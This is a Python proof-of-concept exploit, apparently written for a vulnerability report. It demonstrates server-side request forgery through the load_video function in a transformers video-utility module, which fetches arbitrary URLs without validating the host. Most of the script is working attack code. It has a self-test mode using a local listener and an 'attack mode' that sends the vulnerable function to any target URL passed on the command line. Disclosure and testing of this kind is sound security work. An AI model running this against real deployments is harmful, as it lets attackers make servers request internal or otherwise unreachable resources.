#!/usr/bin/env python3
"""
PoC 2/3 — SSRF via read_video() in video_utils.py

Target:
  https://github.com/huggingface/transformers/blob/main/src/transformers/video_utils.py#L700-L702

Code:
    elif video.startswith("http://") or video.startswith("https://"):
        file_obj = BytesIO(httpx.get(video, follow_redirects=True).content)

No host validation, follow_redirects=True.

Usage:
    python3 poc2_video_utils_ssrf.py                          # 自测模式
    python3 poc2_video_utils_ssrf.py http://target:port/path   # 攻击模式
"""

import http.server
import sys
import threading
import time


def start_listener(port: int):
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            received.append({"path": self.path})
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"poc2-ssrf-confirmed")
        def log_message(self, *a): pass

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, received


def main():
    target_url = sys.argv[1] if len(sys.argv) > 1 else None
    from transformers.video_utils import load_video

    if target_url:
        print(f"[PoC2] load_video('{target_url}')")
        try:
            load_video(target_url)
            print("[*] load_video returned OK")
        except Exception as e:
            print(f"[*] Exception (SSRF already happened): {type(e).__name__}")
        return

    port = 18889
    print(f"[PoC2] Starting listener on 0.0.0.0:{port}")
    server, received = start_listener(port)
    time.sleep(0.3)

    test_url = f"http://127.0.0.1:{port}/poc2-ssrf-video-utils"
    print(f"[PoC2] load_video('{test_url}')")
    try:
        load_video(test_url)
    except Exception:
        pass

    server.shutdown()
    print(f"[PoC2] Listener received {len(received)} requests")
    if received:
        print(f"  PATH: {received[0]['path']}")
        print("  ✅ SSRF CONFIRMED via load_video() -> httpx.get(follow_redirects=True)")
    else:
        print("  ❌ No request received")
        sys.exit(1)


if __name__ == "__main__":
    main()
